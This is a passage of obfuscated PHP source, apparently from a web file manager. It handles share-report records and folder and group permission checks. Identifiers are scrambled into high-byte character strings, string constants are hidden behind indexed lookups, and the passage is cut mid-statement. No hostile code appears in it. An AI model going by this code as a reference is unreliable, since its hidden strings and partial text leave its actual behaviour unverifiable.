$¤£ß¡Á[494]); $¸ò…»ò² = Input::get($¤£ß¡Á[498], $¤£ß¡Á[7], $¤£ß¡Á[465], $è—ú£»Û); $í†¨º‘ = Input::get($¤£ß¡Á[499], $¤£ß¡Á[7], $¤£ß¡Á[2060], array($¤£ß¡Á[1978], $¤£ß¡Á[493])); $í†¨º‘ = $¹ï™ç˜[$í†¨º‘]; $ÛëçÁ = $ÛëçÁ . "{$¸ò…»ò²}\x20{$í†¨º‘}"; return $this->order($ÛëçÁ); } public function reportAdd($æŠµ¿¾ª) { $µ¢æÅã‘ =& $_SERVER[—ÌÒğš÷]; $ÓÉÅ£òå = array($µ¢æÅã‘[633] => $æŠµ¿¾ª[$µ¢æÅã‘[633]], $µ¢æÅã‘[1688] => USER_ID); if (Model($µ¢æÅã‘[2056])->where($ÓÉÅ£òå)->find()) { return !1; } $ò»•†äƒ = array($µ¢æÅã‘[633] => $æŠµ¿¾ª[$µ¢æÅã‘[633]], $µ¢æÅã‘[1585] => $æŠµ¿¾ª[$µ¢æÅã‘[1585]], $µ¢æÅã‘[181] => $æŠµ¿¾ª[$µ¢æÅã‘[181]], $µ¢æÅã‘[509] => $æŠµ¿¾ª[$µ¢æÅã‘[509]], $µ¢æÅã‘[1688] => USER_ID, $µ¢æÅã‘[33] => $æŠµ¿¾ª[$µ¢æÅã‘[33]], $µ¢æÅã‘[494] => $æŠµ¿¾ª[$µ¢æÅã‘[494]]); return Model($µ¢æÅã‘[2056])->add($ò»•†äƒ); } public function reportList($ğƒÄ°ğí) { $÷öì¼Ê =& $_SERVER[—ÌÒğš÷]; $Á›©Ë = array(); if ($ğƒÄ°ğí[$÷öì¼Ê[796]]) { $Á‡íß° = $ğƒÄ°ğí[$÷öì¼Ê[797]] ? $ğƒÄ°ğí[$÷öì¼Ê[797]] : strtotime(date($÷öì¼Ê[2058])); $Á›©Ë[$÷öì¼Ê[215]] = array($÷öì¼Ê[377], array($ğƒÄ°ğí[$÷öì¼Ê[796]], $Á‡íß°)); } if (isset($ğƒÄ°ğí[$÷öì¼Ê[33]]) && in_array($ğƒÄ°ğí[$÷öì¼Ê[33]], array($÷öì¼Ê[88], $÷öì¼Ê[478], $÷öì¼Ê[2061], $÷öì¼Ê[2062], $÷öì¼Ê[2063]))) { $Á›©Ë[$÷öì¼Ê[33]] = $ğƒÄ°ğí[$÷öì¼Ê[33]]; } if (isset($ğƒÄ°ğí[$÷öì¼Ê[786]]) && in_array($ğƒÄ°ğí[$÷öì¼Ê[786]], array($÷öì¼Ê[212], $÷öì¼Ê[88], $÷öì¼Ê[478], $÷öì¼Ê[2061]))) { $Á›©Ë[$÷öì¼Ê[786]] = $ğƒÄ°ğí[$÷öì¼Ê[786]]; } $şÁíîí = Input::get($÷öì¼Ê[499], $÷öì¼Ê[7], $÷öì¼Ê[2060], array($÷öì¼Ê[1978], $÷öì¼Ê[493])); $¨›À—¶¶ = array($÷öì¼Ê[491] => $÷öì¼Ê[492], $÷öì¼Ê[493] => $÷öì¼Ê[494]); $ÜïùÄ¤ = $÷öì¼Ê[2064] . $¨›À—¶¶[$şÁíîí]; $«€É®ğÏ = Model($÷öì¼Ê[2056])->where($Á›©Ë)->order($ÜïùÄ¤)->selectPage(20); if (empty($«€É®ğÏ[$÷öì¼Ê[413]])) { return array(); } $´ €Å³ª = array_to_keyvalue_group($«€É®ğÏ[$÷öì¼Ê[413]], $÷öì¼Ê[786], $÷öì¼Ê[633]); if (!empty($´ €Å³ª[0])) { $ğƒÄ°ğí = $´ €Å³ª[0]; $Á›©Ë = array($÷öì¼Ê[633] => array($÷öì¼Ê[7], $ğƒÄ°ğí)); $™çâÁó˜ = $this->where($Á›©Ë)->field($÷öì¼Ê[633])->select(); $™çâÁó˜ = array_to_keyvalue($™çâÁó˜, $÷öì¼Ê[12], $÷öì¼Ê[633]); $Ùƒ—êÂƒ = array_diff($ğƒÄ°ğí, $™çâÁó˜); if (!empty($Ùƒ—êÂƒ)) { foreach ($«€É®ğÏ[$÷öì¼Ê[413]] as $™œ¦’ => $€ëˆ¢ì¨) { if (in_array($€ëˆ¢ì¨[$÷öì¼Ê[633]], $Ùƒ—êÂƒ)) { unset($«€É®ğÏ[$÷öì¼Ê[413]][$™œ¦’]); } } } } $this->_listDataApply($«€É®ğÏ[$÷öì¼Ê[413]]); return $«€É®ğÏ; } public function reportStatus($›ˆ¤”¨) { $†±†ÇóØ =& $_SERVER[—ÌÒğš÷]; $Œ€®‡ı = array($†±†ÇóØ[443] => $›ˆ¤”¨[$†±†ÇóØ[443]]); $¾³›¿Ó = Model($†±†ÇóØ[2056])->where($Œ€®‡ı)->field($†±†ÇóØ[2065])->find(); if (!$¾³›¿Ó) { return !1; } $ùñƒ”™“ = array($†±†ÇóØ[786] => $›ˆ¤”¨[$†±†ÇóØ[786]]); if ($›ˆ¤”¨[$†±†ÇóØ[786]] == $†±†ÇóØ[2061] && $¾³›¿Ó[$†±†ÇóØ[786]] == $†±†ÇóØ[2061]) { $ùñƒ”™“[$†±†ÇóØ[786]] = 0; } $Ø›²ìŞø = Model($†±†ÇóØ[2056])->where($Œ€®‡ı)->save($ùñƒ”™“); if ($›ˆ¤”¨[$†±†ÇóØ[786]] == $†±†ÇóØ[478]) { if ($¾³›¿Ó[$†±†ÇóØ[509]] != $†±†ÇóØ[212] && $this->shareFileMeta($¾³›¿Ó[$†±†ÇóØ[509]])) { $this->shareFileMeta($¾³›¿Ó[$†±†ÇóØ[509]], 0); } $this->remove($¾³›¿Ó[$†±†ÇóØ[633]]); return !0; } if ($Ø›²ìŞø && $›ˆ¤”¨[$†±†ÇóØ[786]] == $†±†ÇóØ[2061]) { $šÁ‘˜•‰ = $ùñƒ”™“[$†±†ÇóØ[786]] == $†±†ÇóØ[2061] ? 1 : 0; $this->shareFileMeta($¾³›¿Ó[$†±†ÇóØ[509]], $šÁ‘˜•‰); $this->removeByFile($¾³›¿Ó[$†±†ÇóØ[509]]); } return $Ø›²ìŞø; } private function removeByFile($õŒ×ìÎ’) { $ÎŞ“¹î× =& $_SERVER[—ÌÒğš÷]; $Ï‰õŞƒ = Model($ÎŞ“¹î×[861])->where(array($ÎŞ“¹î×[509] => $õŒ×ìÎ’))->field($ÎŞ“¹î×[181])->select(); $ĞııÔÌ­ = array_to_keyvalue($Ï‰õŞƒ, $ÎŞ“¹î×[12], $ÎŞ“¹î×[181]); $˜Ùâ¹¶è = array($ÎŞ“¹î×[181] => array($ÎŞ“¹î×[7], $ĞııÔÌ­), $ÎŞ“¹î×[530] => 1); $Ï‰õŞƒ = $this->where($˜Ùâ¹¶è)->field($ÎŞ“¹î×[633])->select(); if (empty($Ï‰õŞƒ)) { return; } $¦Öîı±È = array_to_keyvalue($Ï‰õŞƒ, $ÎŞ“¹î×[12], $ÎŞ“¹î×[633]); $this->remove($¦Öîı±È); } private function shareFileMeta($‡ÉÚâ²›, $ñÂ¶ü¾ = null) { $ñ„ûòËò =& $_SERVER[—ÌÒğš÷]; $³ÇÀŸÓ¸ = array($ñ„ûòËò[509] => $‡ÉÚâ²›, $ñ„ûòËò[94] => $ñ„ûòËò[2066]); if (is_null($ñÂ¶ü¾)) { return Model($ñ„ûòËò[2067])->where($³ÇÀŸÓ¸)->find(); } $³ÇÀŸÓ¸[$ñ„ûòËò[418]] = $ñÂ¶ü¾; Model($ñ„ûòËò[2067])->add($³ÇÀŸÓ¸, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\143\x65\137\141\165\164\x68"; public function getAuth($ïÀªÌ‘ì) { $É§§£É— =& $_SERVER[—ÌÒğš÷]; $ëâÓÜãä = $this->sourceAuthSelect($ïÀªÌ‘ì); $ÍÚ‹ıËş = array(); $àšÒñ¿¸ = array(); $ÓËƒ±ŒŒ = 2 << 25; foreach ($ëâÓÜãä as $¹ÙŸÍ«™) { $µºĞÍ¹€ = Model($É§§£É—[540])->listData($¹ÙŸÍ«™[$É§§£É—[1991]]); if (!$µºĞÍ¹€) { continue; } $ÍÚ‹ıËş[] = $¹ÙŸÍ«™; $¡Ş•Ç·‡ = 0; if ($¹ÙŸÍ«™[$É§§£É—[178]] == SourceModel::TYPE_GROUP) { $¡Ş•Ç·‡ = $ÓËƒ±ŒŒ * 2; } if ($¹ÙŸÍ«™[$É§§£É—[178]] == SourceModel::TYPE_USER) { $¡Ş•Ç·‡ = $ÓËƒ±ŒŒ; } if ($¹ÙŸÍ«™[$É§§£É—[178]] == SourceModel::TYPE_USER && $¹ÙŸÍ«™[$É§§£É—[538]] == $É§§£É—[212]) { $¡Ş•Ç·‡ = 0; } $àšÒñ¿¸[] = $µºĞÍ¹€[$É§§£É—[455]] + $¡Ş•Ç·‡; } array_multisort($àšÒñ¿¸, SORT_DESC, $ÍÚ‹ıËş); return $ÍÚ‹ıËş; } public function sourceAuthSelect($ßÈöÕ„ª) { $’£ ÷´‘ =& $_SERVER[—ÌÒğš÷]; static $³ª…Ï¤© = array(); $˜±Ãº = is_array($ßÈöÕ„ª) ? !1 : !0; if ($˜±Ãº) { $ßÈöÕ„ª = array($ßÈöÕ„ª); } $İ›ª“­â = array(); foreach ($ßÈöÕ„ª as $è—€›ë) { if (isset($³ª…Ï¤©[$è—€›ë])) { $İ›ª“­â[$è—€›ë] = $³ª…Ï¤©[$è—€›ë]; } } if (count($İ›ª“­â) == count($ßÈöÕ„ª)) { return $˜±Ãº ? $İ›ª“­â[$ßÈöÕ„ª[0]] : $İ›ª“­â; } $È‹¥¶ÃŒ = $’£ ÷´‘[2068]; $ Ò¨Ä¿× = array($’£ ÷´‘[181] => array($’£ ÷´‘[7], $ßÈöÕ„ª)); $£¢éšÛı = $this->field($È‹¥¶ÃŒ)->order($’£ ÷´‘[443])->where($ Ò¨Ä¿×)->select(); $ğÓÁ×Æ« = array_to_keyvalue_group($£¢éšÛı, $’£ ÷´‘[181]); foreach ($ßÈöÕ„ª as $è—€›ë) { $³ª…Ï¤©[$è—€›ë] = $ğÓÁ×Æ«[$è—€›ë] ? $ğÓÁ×Æ«[$è—€›ë] : array(); } if ($˜±Ãº) { return $£¢éšÛı; } return $ğÓÁ×Æ«; } public function setAuth($˜ƒ”ÃÀ, $øƒª”Ä¶) { $¤®§ƒ®¨ =& $_SERVER[—ÌÒğš÷]; $ÒÛ«ºËÄ = Model($¤®§ƒ®¨[1376])->sourceInfo($˜ƒ”ÃÀ); if (!$ÒÛ«ºËÄ) { return !1; } if ($ÒÛ«ºËÄ[$¤®§ƒ®¨[178]] != SourceModel::TYPE_GROUP) { return !1; } $ûğ™ÎÖä = 1; $è÷ùÑî³ = $ÒÛ«ºËÄ[$¤®§ƒ®¨[538]]; if ($è÷ùÑî³ != $ûğ™ÎÖä) { $Ø‡˜ùì‹ = array($¤®§ƒ®¨[1887] => $è÷ùÑî³); $šô×ÄÛ = Model($¤®§ƒ®¨[1977])->field($¤®§ƒ®¨[1688])->where($Ø‡˜ùì‹)->select(); $šô×ÄÛ = array_to_keyvalue($šô×ÄÛ, $¤®§ƒ®¨[12], $¤®§ƒ®¨[1688]); } $ô¥Ã‹ìõ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ó¹Â÷òæ = array(); foreach ($øƒª”Ä¶ as $í¦ßÎ¶é) { if (!in_array($í¦ßÎ¶é[$¤®§ƒ®¨[178]], $ô¥Ã‹ìõ)) { show_json(LNG($¤®§ƒ®¨[2069]), !1); } if ($è÷ùÑî³ != $ûğ™ÎÖä) { if ($í¦ßÎ¶é[$¤®§ƒ®¨[178]] == SourceModel::TYPE_GROUP) { } if ($í¦ßÎ¶é[$¤®§ƒ®¨[538]] != 0 && !in_array($í¦ßÎ¶é[$¤®§ƒ®¨[538]], $šô×ÄÛ)) { } } if ($í¦ßÎ¶é[$¤®§ƒ®¨[538]] == 0) { $í¦ßÎ¶é[$¤®§ƒ®¨[178]] = SourceModel::TYPE_USER; } $ó¹Â÷òæ[] = array($¤®§ƒ®¨[181] => $˜ƒ”ÃÀ, $¤®§ƒ®¨[178] => intval($í¦ßÎ¶é[$¤®§ƒ®¨[178]]), $¤®§ƒ®¨[538] => intval($í¦ßÎ¶é[$¤®§ƒ®¨[538]]), $¤®§ƒ®¨[1991] => intval($í¦ßÎ¶é[$¤®§ƒ®¨[1991]]) ? intval($í¦ßÎ¶é[$¤®§ƒ®¨[1991]]) : 0, $¤®§ƒ®¨[2051] => intval($í¦ßÎ¶é[$¤®§ƒ®¨[2051]]) ? intval($í¦ßÎ¶é[$¤®§ƒ®¨[2051]]) : -1); } $this->where(array($¤®§ƒ®¨[459] => $˜ƒ”ÃÀ))->delete(); $this->addAll($ó¹Â÷òæ); return !0; } public function authClear($“öÚÉ¦õ) { $§ÍÈÄ›Ï =& $_SERVER[—ÌÒğš÷]; $¾ú·“è = Model($§ÍÈÄ›Ï[1376])->sourceInfo($“öÚÉ¦õ); $à¦åš« = array($“öÚÉ¦õ); if ($¾ú·“è[$§ÍÈÄ›Ï[453]] == $§ÍÈÄ›Ï[88]) { $Âºáô† = array($§ÍÈÄ›Ï[620] => array($§ÍÈÄ›Ï[580], $¾ú·“è[$§ÍÈÄ›Ï[553]] . $“öÚÉ¦õ . $§ÍÈÄ›Ï[581])); $à¦åš« = Model($§ÍÈÄ›Ï[1376])->field($§ÍÈÄ›Ï[459])->where($Âºáô†)->getField($§ÍÈÄ›Ï[181], !0); $à¦åš«[] = $“öÚÉ¦õ; } $this->where(array($§ÍÈÄ›Ï[459] => array($§ÍÈÄ›Ï[460], $à¦åš«)))->delete(); return !0; } public function getAllChildren($¤¼´àù) { $ï¦•¡ =& $_SERVER[—ÌÒğš÷]; $ÓÁÇ¤Éƒ = Model($ï¦•¡[1376])->sourceInfo($¤¼´àù); if ($ÓÁÇ¤Éƒ[$ï¦•¡[453]] != $ï¦•¡[88]) { return $this->sourceListAuth(array($¤¼´àù)); } if ($ÓÁÇ¤Éƒ[$ï¦•¡[178]] != SourceModel::TYPE_GROUP) { return array(); } $ˆÙ‰¢‡ş = 1; $îÙˆ¹õÍ = array($¤¼´àù); if ($ÓÁÇ¤Éƒ[$ï¦•¡[180]] == $ï¦•¡[212] && $ÓÁÇ¤Éƒ[$ï¦•¡[538]] != $ˆÙ‰¢‡ş) { $îÙˆ¹õÍ = $this->groupChidldAllRootSource($ÓÁÇ¤Éƒ[$ï¦•¡[538]]); } $Ü¥—‡º¼ = $this->field($ï¦•¡[181])->group($ï¦•¡[181])->select(); $Ü¥—‡º¼ = array_to_keyvalue($Ü¥—‡º¼, $ï¦•¡[12], $ï¦•¡[181]); if (!$Ü¥—‡º¼) { return array(); } $í‰Åú¡Ş = $ï¦•¡[2070]; $ÔşÚÌå = array($ï¦•¡[181] => array($ï¦•¡[7], $Ü¥—‡º¼), $ï¦•¡[473] => $ï¦•¡[212]); $´ìÕÒùç = Model($ï¦•¡[861])->field($í‰Åú¡Ş)->where($ÔşÚÌå)->select(); $»÷Í®´» = array($¤¼´àù); foreach ($´ìÕÒùç as $’–¦»¬) { foreach ($îÙˆ¹õÍ as $ïÁ‹¶Í¶) { $ëËó¤¸İ = $ï¦•¡[50] . $ïÁ‹¶Í¶ . $ï¦•¡[50]; $éğïÂ£ = $’–¦»¬[$ï¦•¡[553]] . $’–¦»¬[$ï¦•¡[181]] . $ï¦•¡[50]; if (strstr($éğïÂ£, $ëËó¤¸İ)) { $»÷Í®´»[] = $’–¦»¬[$ï¦•¡[181]]; break; } } } return $this->sourceListAuth($»÷Í®´»); } private function sourceListAuth($·§³Ê•) { $Öº‚®á‹ =& $_SERVER[—ÌÒğš÷]; $úş‡„ş = Model($Öº‚®á‹[1376])->sourceListInfo($·§³Ê•, !0); $ò¯›†¡© = $this->sourceAuthSelect($·§³Ê•); $˜ô¢¤Õ = array(); $½©”ùÇ¾ = array(); foreach ($úş‡„ş as $á†‡ŞÀ) { unset($á†‡ŞÀ[$Öº‚®á‹[497]]); unset($á†‡ŞÀ[$Öº‚®á‹[495]]); unset($á†‡ŞÀ[$Öº‚®á‹[455]]); unset($á†‡ŞÀ[$Öº‚®á‹[87]]); $‚ùï„‘º = $ò¯›†¡©[$á†‡ŞÀ[$Öº‚®á‹[181]]]; if (!$‚ùï„‘º) { continue; } $á†‡ŞÀ[$Öº‚®á‹[2071]] = $this->authTargetInfo($‚ùï„‘º); $á†‡ŞÀ[$Öº‚®á‹[551]] = rtrim($á†‡ŞÀ[$Öº‚®á‹[557]], $Öº‚®á‹[8]) . $Öº‚®á‹[8] . ltrim($á†‡ŞÀ[$Öº‚®á‹[551]], $Öº‚®á‹[8]); $˜ô¢¤Õ[] = $á†‡ŞÀ; $ç¦É±‡Ü = count(explode($Öº‚®á‹[8], trim($á†‡ŞÀ[$Öº‚®á‹[551]], $Öº‚®á‹[8]))); $½©”ùÇ¾[] = $ç¦É±‡Ü + ($á†‡ŞÀ[$Öº‚®á‹[33]] == $Öº‚®á‹[75] ? 0 : 1000); } array_multisort($½©”ùÇ¾, SORT_ASC, $˜ô¢¤Õ); return $˜ô¢¤Õ; } private function groupChidldAllRootSource($Êñ£Å¿Í) { $®Æ¡½ûİ =& $_SERVER[—ÌÒğš÷]; $¥¯ÒËûè = Model($®Æ¡½ûİ[2072])->groupChildrenAll($Êñ£Å¿Í); $ª°¸éá = array($®Æ¡½ûİ[180] => 0, $®Æ¡½ûİ[538] => array($®Æ¡½ûİ[7], $¥¯ÒËûè), $®Æ¡½ûİ[178] => SourceModel::TYPE_GROUP); $ÎÑ´Õ· = Model($®Æ¡½ûİ[861])->field($®Æ¡½ûİ[181])->where($ª°¸éá)->select(); $ÎÑ´Õ· = array_to_keyvalue($ÎÑ´Õ·, $®Æ¡½ûİ[12], $®Æ¡½ûİ[181]); return $ÎÑ´Õ·; } private function authTargetInfo($¿˜½„§Ç) { $¨ÉµıŒû =& $_SERVER[—ÌÒğš÷]; $€åöşàÎ = array(); $Ñ´¶š°• = array(); $ß¢Òñ„• = 2 << 25; foreach ($¿˜½„§Ç as $¹ËïÒ°¬) { $¯Ôçğ¬î = Model($¨ÉµıŒû[540])->listData($¹ËïÒ°¬[$¨ÉµıŒû[1991]]); if (!$¯Ôçğ¬î) { continue; } if ($¹ËïÒ°¬[$¨ÉµıŒû[178]] == SourceModel::TYPE_USER) { $¿ûŞ½… = Model($¨ÉµıŒû[546])->getInfoSimpleOuter($¹ËïÒ°¬[$¨ÉµıŒû[538]]); if ($¿ûŞ½…[$¨ÉµıŒû[1688]] == $¨ÉµıŒû[1232]) { continue; } if ($¿ûŞ½…[$¨ÉµıŒû[1688]] == $¨ÉµıŒû[212]) { $¿ûŞ½…[$¨ÉµıŒû[32]] = LNG($¨ÉµıŒû[2073]); } } else { $¿ûŞ½… = Model($¨ÉµıŒû[554])->getInfoSimple($¹ËïÒ°¬[$¨ÉµıŒû[538]]); } if (!$¿ûŞ½…) { continue; } $¿ûŞ½…[$¨ÉµıŒû[508]] = $¯Ôçğ¬î; $€åöşàÎ[] = $¿ûŞ½…; $ˆÏ†Ç—Ì = 0; if ($¹ËïÒ°¬[$¨ÉµıŒû[178]] == SourceModel::TYPE_GROUP) { $ˆÏ†Ç—Ì = $ß¢Òñ„• * 2; } if ($¹ËïÒ°¬[$¨ÉµıŒû[178]] == SourceModel::TYPE_USER) { $ˆÏ†Ç—Ì = $ß¢Òñ„•; } if ($¹ËïÒ°¬[$¨ÉµıŒû[178]] == SourceModel::TYPE_USER && $¹ËïÒ°¬[$¨ÉµıŒû[538]] == $¨ÉµıŒû[212]) { $ˆÏ†Ç—Ì = 0; } $Ñ´¶š°•[] = $¯Ôçğ¬î[$¨ÉµıŒû[455]] + $ˆÏ†Ç—Ì; } array_multisort($Ñ´¶š°•, SORT_DESC, $€åöşàÎ); return $€åöşàÎ; } public function getAllChildrenByUser($®Âß–©Â, $†Ó¸Á‚Ô) { $±÷Şå =& $_SERVER[—ÌÒğš÷]; $‘¾ôÄ÷ú = Model($±÷Şå[567])->getInfo($†Ó¸Á‚Ô); if (!$†Ó¸Á‚Ô || !$®Âß–©Â || !$‘¾ôÄ÷ú) { return array(); } $¿„õ×Òû = Model($±÷Şå[1376])->sourceInfo($®Âß–©Â); $ú½üéÂ = array(); $Š–ò„¸ = 1; if ($¿„õ×Òû[$±÷Şå[180]] == $±÷Şå[212] && $¿„õ×Òû[$±÷Şå[538]] != $Š–ò„¸ && $this->groupContainUser($¿„õ×Òû[$±÷Şå[538]], $†Ó¸Á‚Ô)) { foreach ($‘¾ôÄ÷ú[$±÷Şå[2074]] as $§…½¬›©) { $ìÜ ‘º½ = Model($±÷Şå[554])->getInfo($§…½¬›©[$±÷Şå[1887]]); $Ó¿‹¯  = Model($±÷Şå[567])->getInfoSimpleOuter($†Ó¸Á‚Ô); $Ó¿‹¯ [$±÷Şå[508]] = $§…½¬›©[$±÷Şå[455]]; if (Model($±÷Şå[540])->authCheckAction($§…½¬›©[$±÷Şå[455]][$±÷Şå[455]], $±÷Şå[1908])) { continue; } $ç¥­Ïè´ = array($±÷Şå[32] => $±÷Şå[1252] . $ìÜ ‘º½[$±÷Şå[32]], $±÷Şå[181] => $ìÜ ‘º½[$±÷Şå[87]][$±÷Şå[181]], $±÷Şå[84] => KodIO::make($ìÜ ‘º½[$±÷Şå[87]][$±÷Şå[181]]), $±÷Şå[180] => $±÷Şå[212], $±÷Şå[178] => $±÷Şå[547], $±÷Şå[33] => $±÷Şå[584], $±÷Şå[551] => $ìÜ ‘º½[$±÷Şå[558]], $±÷Şå[1887] => $ìÜ ‘º½[$±÷Şå[1887]], $±÷Şå[555] => $ìÜ ‘º½[$±÷Şå[180]], $±÷Şå[2071] => array($Ó¿‹¯ )); $ú½üéÂ[$ç¥­Ïè´[$±÷Şå[181]]] = $ç¥­Ïè´; } } $Êœ‚Ä = array(); $ö†ÍÅ¼Ğ = $this->getAllChildren($®Âß–©Â); foreach ($ö†ÍÅ¼Ğ as $Ş—ÒÒ’²) { $Ö÷°³ş = !1; foreach ($Ş—ÒÒ’²[$±÷Şå[2071]] as $­¦ã¶ß) { if ($­¦ã¶ß[$±÷Şå[1688]]) { if ($­¦ã¶ß[$±÷Şå[1688]] == $†Ó¸Á‚Ô) { $Ö÷°³ş = !0; break; } } if ($­¦ã¶ß[$±÷Şå[1887]]) { if ($this->groupContainUser($­¦ã¶ß[$±÷Şå[1887]], $†Ó¸Á‚Ô)) { $Ö÷°³ş = !0; break; } } } if ($Ö÷°³ş) { $Êœ‚Ä[] = $Ş—ÒÒ’²; } $³óªıí’ = $Ş—ÒÒ’²[$±÷Şå[181]]; if (isset($ú½üéÂ[$³óªıí’])) { $Ş—ÒÒ’²[$±÷Şå[2071]][] = $ú½üéÂ[$³óªıí’][0]; $ú½üéÂ[$³óªıí’] = !1; } } $ú½üéÂ = array_filter(array_values($ú½üéÂ)); $Êœ‚Ä = array_merge($ú½üéÂ, $Êœ‚Ä); return $Êœ‚Ä; } public function setAllChildrenByUser($ûì™›‘Ì, $¯›’Û, $¨¤ôÈ´…) { $Òöæï =& $_SERVER[—ÌÒğš÷]; $Ã¢û½’Û = $this->getAllChildrenByUser($ûì™›‘Ì, $¯›’Û); if (!$¨¤ôÈ´… || !$Ã¢û½’Û) { return !1; } foreach ($Ã¢û½’Û as $İºå·¡§) { $Äğ§„ØÔ = array(); foreach ($İºå·¡§[$Òöæï[2071]] as $ëºÆ½çæ) { $‰İ¤ûò = $ëºÆ½çæ[$Òöæï[508]]; $È«ØÖ¥Â = $ëºÆ½çæ[$Òöæï[1688]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $”²ûèŸ¼ = $ëºÆ½çæ[$Òöæï[1688]] ? $ëºÆ½çæ[$Òöæï[1688]] : $ëºÆ½çæ[$Òöæï[1887]]; if ($ëºÆ½çæ[$Òöæï[1688]] && $ëºÆ½çæ[$Òöæï[1688]] == $¯›’Û) { continue; } $Äğ§„ØÔ[] = array($Òöæï[181] => $İºå·¡§[$Òöæï[181]], $Òöæï[178] => $È«ØÖ¥Â, $Òöæï[538] => intval($”²ûèŸ¼), $Òöæï[1991] => isset($‰İ¤ûò[$Òöæï[443]]) ? intval($‰İ¤ûò[$Òöæï[443]]) : 0, $Òöæï[2051] => isset($‰İ¤ûò[$Òöæï[2051]]) ? intval($‰İ¤ûò[$Òöæï[2051]]) : -1); } $Äğ§„ØÔ[] = array($Òöæï[181] => $İºå·¡§[$Òöæï[181]], $Òöæï[178] => SourceModel::TYPE_USER, $Òöæï[538] => intval($¯›’Û), $Òöæï[1991] => intval($¨¤ôÈ´…), $Òöæï[2051] => -1); $this->where(array($Òöæï[459] => $İºå·¡§[$Òöæï[181]]))->delete(); $this->addAll($Äğ§„ØÔ); } return !0; } public function get($™‹†ííÃ) { $åßÎÄº = $this->getSourceList(array($™‹†ííÃ), !0); return $åßÎÄº[0]; } public function getSourceList($ŠŠõ‹õÉ, $‘Ò†÷©ˆ = false, $¬ÒˆÊ³Ã = false) { $³í°Ëï =& $_SERVER[—ÌÒğš÷]; if (!$ŠŠõ‹õÉ) { return array(); } $×ú±í¤„ = Model($³í°Ëï[1376]); if (!$‘Ò†÷©ˆ && count($ŠŠõ‹õÉ) == 1) { $‘Ò†÷©ˆ = array(); $‘Ò†÷©ˆ[$ŠŠõ‹õÉ[0]] = $×ú±í¤„->sourceInfo($ŠŠõ‹õÉ[0]); } if (!$‘Ò†÷©ˆ) { $½†®¯øˆ = array($³í°Ëï[459] => array($³í°Ëï[460], $ŠŠõ‹õÉ)); $‘Ò†÷©ˆ = $×ú±í¤„->field($³í°Ëï[2075])->where($½†®¯øˆ)->select(); $‘Ò†÷©ˆ = array_to_keyvalue($‘Ò†÷©ˆ, $³í°Ëï[181]); } $ËÚˆ“Ñê = $ŠŠõ‹õÉ; foreach ($‘Ò†÷©ˆ as $˜İÜùûÚ => $”ÆÜÍ’‹) { $Ä…ú‹í˜ = $×ú±í¤„->parentLevelArray($”ÆÜÍ’‹[$³í°Ëï[553]]); $ËÚˆ“Ñê = array_merge($ËÚˆ“Ñê, array($˜İÜùûÚ), array_reverse($Ä…ú‹í˜)); } $ËÚˆ“Ñê = array_values(array_unique($ËÚˆ“Ñê)); if (!$ËÚˆ“Ñê) { return array(); } $¨š„”æ = $this->sourceAuthSelect($ËÚˆ“Ñê); $¥¿ò¡£ = array(); foreach ($ËÚˆ“Ñê as $ƒ‡™ìÊ¤) { if (isset($¨š„”æ[$ƒ‡™ìÊ¤])) { $¥¿ò¡£[$ƒ‡™ìÊ¤] = $¨š„”æ[$ƒ‡™ìÊ¤]; } } $™Ë¥¢†™ = $this->userIsRoot($¬ÒˆÊ³Ã); $Ò½ßÎÅ¹ = AuthModel::authAll(); $‚ÄùÇ‡Œ = array($³í°Ëï[456] => $Ò½ßÎÅ¹, $³í°Ëï[2076] => array($³í°Ëï[461] => 0, $³í°Ëï[1893] => $Ò½ßÎÅ¹, $³í°Ëï[462] => LNG($³í°Ëï[2077]), $³í°Ëï[1910] => $³í°Ëï[2078])); $Í”£Òú´ = array(); foreach ($‘Ò†÷©ˆ as $ƒ‡™ìÊ¤ => $Òº§ÌÚç) { if ($™Ë¥¢†™ && $GLOBALS[$³í°Ëï[6]][$³í°Ëï[1906]]) { $Í”£Òú´[$ƒ‡™ìÊ¤] = $‚ÄùÇ‡Œ; continue; } $Í”£Òú´[$ƒ‡™ìÊ¤] = $this->makeSourceAuth($Òº§ÌÚç, $¥¿ò¡£, $¬ÒˆÊ³Ã); } return $Í”£Òú´; } public function authDeepCheck($¦çà†ú‚, $öÑ¶ = false) { $àŞ“¿ =& $_SERVER[—ÌÒğš÷]; $öÑ¶ = $öÑ¶ ? $öÑ¶ : USER_ID; $‘¾ŠÃÍ¹ = $this->makeAuthDeep($öÑ¶); if (!in_array($¦çà†ú‚, $‘¾ŠÃÍ¹[$àŞ“¿[2079]])) { return !1; } $›Õã‘š€ = array(); foreach ($‘¾ŠÃÍ¹[$àŞ“¿[2080]] as $÷»»Âù‰ => $ú´½Ü¼Ñ) { if (!in_array($¦çà†ú‚, $ú´½Ü¼Ñ)) { continue; } $›Õã‘š€[] = $÷»»Âù‰; } if (!$›Õã‘š€) { return !1; } $„Šä»±í = $›Õã‘š€ ? $›Õã‘š€[0] : $¦çà†ú‚; return array($àŞ“¿[456] => -1, $àŞ“¿[508] => array($àŞ“¿[461] => $àŞ“¿[1232], $àŞ“¿[1893] => $àŞ“¿[212], $àŞ“¿[462] => LNG($àŞ“¿[2081]), $àŞ“¿[1910] => $àŞ“¿[2082]), $àŞ“¿[2083] => LNG($àŞ“¿[2084]), $àŞ“¿[2085] => $this->sourceAuthInfo($„Šä»±í)); } protected function makeAuthDeep($ àÂß¬Ä = false) { $­§û¥™‚ =& $_SERVER[—ÌÒğš÷]; static $ñÖò­Â = array(); $ àÂß¬Ä = $ àÂß¬Ä ? $ àÂß¬Ä : USER_ID; if (isset($ñÖò­Â[$ àÂß¬Ä])) { return $ñÖò­Â[$ àÂß¬Ä]; } $ÎïÒïÜ = Model($­§û¥™‚[2086])->listData(); $®ıÍõéä = array(); foreach ($ÎïÒïÜ as $…ş©ãßî) { if ($…ş©ãßî[$­§û¥™‚[455]] == 0 && $…ş©ãßî[$­§û¥™‚[1909]] == $­§û¥™‚[88]) { $®ıÍõéä[] = $…ş©ãßî[$­§û¥™‚[443]]; } } $¶×™Øğ‹ = $this->userGroupParents($ àÂß¬Ä); $­Ì“ÂÂÙ = array($­§û¥™‚[178] => SourceModel::TYPE_USER, $­§û¥™‚[538] => $ àÂß¬Ä); if ($¶×™Øğ‹) { $­Ì“ÂÂÙ = array(array($­§û¥™‚[178] => SourceModel::TYPE_USER, $­§û¥™‚[538] => $ àÂß¬Ä), 